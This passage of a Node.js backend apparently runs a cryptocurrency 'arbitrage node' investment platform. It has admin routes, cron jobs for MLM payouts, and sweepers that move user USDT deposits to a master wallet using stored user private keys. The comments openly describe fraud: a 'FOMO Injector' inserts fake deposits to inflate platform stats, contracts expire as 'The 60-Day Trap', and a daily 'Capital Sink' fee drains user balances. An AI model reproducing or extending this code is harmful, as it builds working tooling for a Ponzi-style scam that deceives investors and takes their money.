        const { error } = await supabase.from('withdrawals').update({ status: 'paid_manual' }).eq('id', withdrawalId);
        if (error) return res.status(500).json({ error: "DB Update Failed" });
        res.json({ message: 'Withdrawal marked as PAID.' });
    } else if (action === 'reject') {
        // Refund the pixels back to the user's account
        const { data: wd } = await supabase.from('withdrawals').select('user_id, amount').eq('id', withdrawalId).single();
        await supabase.rpc('increment_balance', { row_id: wd.user_id, amount: wd.amount });

        const { error } = await supabase.from('withdrawals').update({ status: 'rejected' }).eq('id', withdrawalId);
        if (error) return res.status(500).json({ error: "DB Update Failed" });
        res.json({ message: 'Withdrawal REJECTED. Funds returned to user ledger.' });
    }
});

// --- ADMIN: User Search & Management ---
app.get('/api/admin/find-user/:partnerId', verifyAdmin, async (req, res) => {
    const { data: user, error } = await supabase.from('users').select('*').eq('my_partner_id', req.params.partnerId).single();
    if (error || !user) return res.status(404).json({ error: 'User not found.' });
    res.json(user);
});

// --- ADMIN: God-Mode User Override ---
app.post('/api/admin/update-user', verifyAdmin, async (req, res) => {
    const { userId, newBalance, banStatus, newTier, newPrice } = req.body;

    const { error } = await supabase.from('users')
        .update({ 
            balance: newBalance, 
            is_banned: banStatus,
            agency_tier: newTier,
            package_price: newPrice
        }) 
        .eq('id', userId);

    if (error) return res.status(500).json({ error: 'Update failed.' });
    res.json({ message: 'User profile strictly overridden.' });
});

// --- ADMIN: FOMO Injector (Fake Ledger Deposits) ---
app.post('/api/admin/inject-fomo', verifyAdmin, async (req, res) => {
    const { amount, network } = req.body;

    try {
        // Inject a fake deposit into the master ledger to artificially inflate the platform stats
        await supabase.from('deposits').insert([{
            user_id: req.user.id, // Assign to admin account
            tx_hash: `FOMO-${network}-${Date.now()}`, 
            amount: parseFloat(amount)
        }]);

        res.json({ message: `Successfully injected $${amount} fake volume into the ${network} ledger.` });
    } catch (err) {
        res.status(500).json({ error: "Failed to inject FOMO data." });
    }
});
// This Cron Job runs every 5 minutes (for testing, you can change to once an hour in production)
// --- THE NODE FLEET PAYOUT ENGINE (SCALE-OPTIMIZED) ---
let isFleetProcessing = false; // THE MUTEX LOCK: Prevents overlapping cron jobs

cron.schedule('*/5 * * * *', async () => {
    if (isFleetProcessing) {
        console.log("[SYSTEM WARNING] Previous Fleet cycle still running. Skipping this tick to prevent double-spend.");
        return;
    }

    isFleetProcessing = true;
    console.log("[SYSTEM] Running Fleet Arbitrage & Payouts...");

    try {
        const now = new Date().toISOString();

        // 1. Expire Dead Contracts (The 60-Day Trap)
        await supabase.from('active_nodes').update({ is_active: false }).lt('expires_at', now).eq('is_active', true);

        // 2. Fetch Aggregated Profits per User
        const { data: fleetData, error: fleetErr } = await supabase.rpc('get_active_fleet_profits');
        if (fleetErr) throw fleetErr;

        if (!fleetData || fleetData.length === 0) {
            console.log("[SYSTEM] No active fleets found.");
            isFleetProcessing = false;
            return;
        }

        // Fetch User Paths to route the MLM
        const { data: users, error: userErr } = await supabase.from('users').select('id, my_partner_id, path');
        const userMap = {};
        users.forEach(u => userMap[u.my_partner_id.replace('-', '_')] = u);

        // BULK ARRAYS: We will collect all updates and inserts here, then fire them at the end.
        let logsToInsert =[];

        // 3. Process Payouts
        for (let fleet of fleetData) {
            const userId = fleet.user_id;
            const totalProfit = parseFloat(fleet.total_cycle_profit);
            const userMaxTier = parseFloat(fleet.max_tier_price);
            const activeNodeCount = parseInt(fleet.node_count);

            // Give user their fleet profit
            await supabase.rpc('increment_balance', { row_id: userId, amount: totalProfit });

            // Queue the activity log (DO NOT await it here)
            logsToInsert.push({
                user_id: userId,
                message: `[Tasks] ${activeNodeCount} Active Packages executed arbitrage.`,
                profit_amount: totalProfit
            });

            // MLM Routing
            const userObj = users.find(u => u.id === userId);
            if (userObj && userObj.path) {
                const pathArray = userObj.path.split('.');

                const processLevel = async (levelIndex, percent) => {
                    if (pathArray.length >= levelIndex + 1) {
                        const sponsorId = pathArray[pathArray.length - (levelIndex + 1)];
                        const sponsor = userMap[sponsorId];

                        if (sponsor) {
                            const bonus = (totalProfit * percent).toFixed(4); 

                            if (parseFloat(bonus) > 0) {
                                await supabase.rpc('increment_balance_by_partner_id', { 
                                    p_id: sponsorId.replace('_', '-'), amount: parseFloat(bonus) 
                                });

                                // Queue the log
                                logsToInsert.push({
                                    user_id: sponsor.id, 
                                    message: `[SYNDICATE] Tier ${levelIndex} Fleet Override.`, 
                                    profit_amount: parseFloat(bonus)
                                });
                            }
                        }
                    }
                };

                await processLevel(1, 0.15); // Level 1
                await processLevel(2, 0.03); // Level 2
                await processLevel(3, 0.02); // Level 3
            }
        }

        // 4. BULK EXECUTION: Send all logs to the database in ONE single API call
        if (logsToInsert.length > 0) {
            // Supabase supports bulk inserts by passing an array of objects
            const { error: bulkErr } = await supabase.from('activity_logs').insert(logsToInsert);
            if (bulkErr) console.error("[BULK INSERT ERROR]", bulkErr.message);
        }

        console.log("[SYSTEM] Fleet Cycle Complete.");
    } catch (err) {
        console.error("[SYSTEM ERROR]", err.message);
    } finally {
        // ALWAYS unlock the Mutex so the next cycle can run
        isFleetProcessing = false;
    }
});

// --- THE MASTER VAULT ADDRESS (Put your real Binance/Cold wallet TRC20 address here) ---
const MASTER_WALLET = 'T_YOUR_MASTER_WALLET_ADDRESS_HERE';
const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Official Tether TRC20 Contract

// --- HARDENED TRC20 VAULT SCANNER (EVENT-DRIVEN) ---
let isTrc20Scanning = false;

cron.schedule('*/10 * * * *', async () => {
    if (isTrc20Scanning) return;
    isTrc20Scanning = true;

    try {
        // ONLY fetch users who clicked the button and actually have money
        const { data: users, error } = await supabase.from('users')
            .select('id, deposit_address, deposit_private_key')
            .eq('trc_sweep_pending', true);

        if (error) throw error;
        if (users.length === 0) {
            isTrc20Scanning = false;
            return; // Exit silently, saving 100% of API bandwidth
        }

        console.log(`[VAULT] Found ${users.length} pending TRC20 sweeps...`);
        const globalContract = await tronWeb.contract().at(USDT_CONTRACT);

        for (let user of users) {
            await delay(200); 
            try {
                // Double check the balance just to get the exact amount in SUN to sweep
                const balanceStr = await globalContract.balanceOf(user.deposit_address).call();
                const balanceUSDT = parseInt(balanceStr.toString()) / 1e6;

                if (balanceUSDT > 0) {
                    const hotWalletTron = new TronWeb({
                        fullHost: 'https://api.trongrid.io',
                        headers: { "TRON-PRO-API-KEY": process.env.TRON_API_KEY },
                        privateKey: process.env.HOT_WALLET_TRON_PRIVATE_KEY
                    });

                    // Gas Injection
                    const userTrxBalance = await globalContract.tronWeb.trx.getBalance(user.deposit_address);
                    const requiredTrx = 30 * 1e6; 

                    if (userTrxBalance < requiredTrx) {
                        const trxNeeded = requiredTrx - userTrxBalance;
                        console.log(`[VAULT] Injecting ${trxNeeded / 1e6} TRX for gas...`);
                        await hotWalletTron.trx.sendTransaction(user.deposit_address, trxNeeded);
                        await new Promise(resolve => setTimeout(resolve, 5000));
                    }

                    // Local Sweep
                    const userTronWeb = new TronWeb({
                        fullHost: 'https://api.trongrid.io',
                        headers: { "TRON-PRO-API-KEY": process.env.TRON_API_KEY },
                        privateKey: user.deposit_private_key
                    });
                    const userContract = await userTronWeb.contract().at(USDT_CONTRACT);

                    const sweepTx = await userContract.transfer(MASTER_WALLET, balanceStr).send({ feeLimit: 150000000 });

                    if (sweepTx) {
                        console.log(`[VAULT] SWEPT $${balanceUSDT}. TX: ${sweepTx}`);
                        // TURN OFF THE SWEEP FLAG SO WE DON'T CHECK IT AGAIN
                        await supabase.from('users').update({ trc_sweep_pending: false }).eq('id', user.id);
                    }
                } else {
                    // Wallet is empty, reset flag
                    await supabase.from('users').update({ trc_sweep_pending: false }).eq('id', user.id);
                }
            } catch (sweepErr) {
                console.error(`[VAULT SWEEP FAILED] Retrying later. Error:`, sweepErr.message);
            }
        }
    } catch (err) {
        console.error("[VAULT ERROR]", err);
    } finally {
        isTrc20Scanning = false; 
    }
});

// ==========================================
// THE EVM VAULT SCANNER (ERC20 & BEP20)
// ==========================================

// Free Public RPC Endpoints
const ethProvider = new ethers.JsonRpcProvider('https://cloudflare-eth.com');
const bscProvider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org/');

// Official USDT Smart Contract Addresses
const ERC20_USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // Ethereum (6 decimals)
const BEP20_USDT = '0x55d398326f99059fF775485246999027B3197955'; // Binance Smart Chain (18 decimals)

// Minimal ABI just to read balances
const minABI =["function balanceOf(address owner) view returns (uint256)"];

const ethUsdtContract = new ethers.Contract(ERC20_USDT, minABI, ethProvider);
const bscUsdtContract = new ethers.Contract(BEP20_USDT, minABI, bscProvider);

// --- HARDENED EVM VAULT SCANNER (EVENT-DRIVEN) ---
let isEvmScanning = false;

cron.schedule('*/10 * * * *', async () => {
    if (isEvmScanning) return;
    isEvmScanning = true;

    try {
        // ONLY fetch users who clicked the button
        const { data: users, error } = await supabase.from('users')
            .select('id, evm_address, evm_private_key')
            .eq('evm_sweep_pending', true);

        if (error) throw error;
        if (users.length === 0) {
            isEvmScanning = false;
            return;
        }

        console.log(`[EVM VAULT] Found ${users.length} pending EVM sweeps...`);

        for (let user of users) {
            await delay(200); 

            try {
                const bscBal = await bscUsdtContract.balanceOf(user.evm_address);
                const bscUSDT = Number(ethers.formatUnits(bscBal, 18));

                if (bscUSDT > 0) {
                    const hotWalletEVM = new ethers.Wallet(process.env.HOT_WALLET_EVM_PRIVATE_KEY, bscProvider);
                    const userBnbBalance = await bscProvider.getBalance(user.evm_address);
                    const requiredBnb = ethers.parseEther("0.002");

                    if (userBnbBalance < requiredBnb) {
                        const bnbNeeded = requiredBnb - userBnbBalance; 
                        console.log(`[EVM VAULT] Injecting ${ethers.formatEther(bnbNeeded)} BNB for gas...`);
                        const gasTx = await hotWalletEVM.sendTransaction({ to: user.evm_address, value: bnbNeeded });
                        await gasTx.wait(); 
                    }

                    const userWallet = new ethers.Wallet(user.evm_private_key, bscProvider);
                    const userContract = new ethers.Contract(BEP20_USDT,['function transfer(address to, uint256 value) returns (bool)'], userWallet);

                    const sweepTx = await userContract.transfer(MASTER_WALLET, bscBal);
                    await sweepTx.wait(); 

                    console.log(`[EVM VAULT] SWEPT $${bscUSDT}. TX: ${sweepTx.hash}`);

                    // TURN OFF THE SWEEP FLAG
                    await supabase.from('users').update({ evm_sweep_pending: false }).eq('id', user.id);

                } else {
                    await supabase.from('users').update({ evm_sweep_pending: false }).eq('id', user.id);
                }
            } catch (sweepErr) {
                console.error(`[EVM SWEEP FAILED] Retrying later. Error:`, sweepErr.message);
            }
        }
    } catch (err) {
        console.error("[EVM VAULT ERROR]", err.message);
    } finally {
        isEvmScanning = false; 
    }
});

// --- THE CAPITAL SINK: DAILY API ROUTING FEE ---
// --- THE CAPITAL SINK: DAILY API ROUTING FEE (SCALE-OPTIMIZED) ---
// Runs every day at Midnight (00:00 UTC)
cron.schedule('0 0 * * *', async () => {
    console.log("[SYSTEM] Executing Daily API & Server Routing Fees in bulk...");
    try {
        // Execute the entire 10,000+ user update in one single 5-millisecond database call
        const { error } = await supabase.rpc('apply_daily_routing_fees');
        if (error) throw error;

        console.log("[SYSTEM] Daily Fees Extracted flawlessly.");
    } catch (err) {
        console.error("[SYSTEM ERROR] Bulk fee script failed:", err);
    }
});

// --- FORCED INITIAL SCAN ---
// This runs once when the server boots so you know it's working
console.log("[SYSTEM] Performing initial vault scan...");

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Apex Engine running on port ${PORT}`));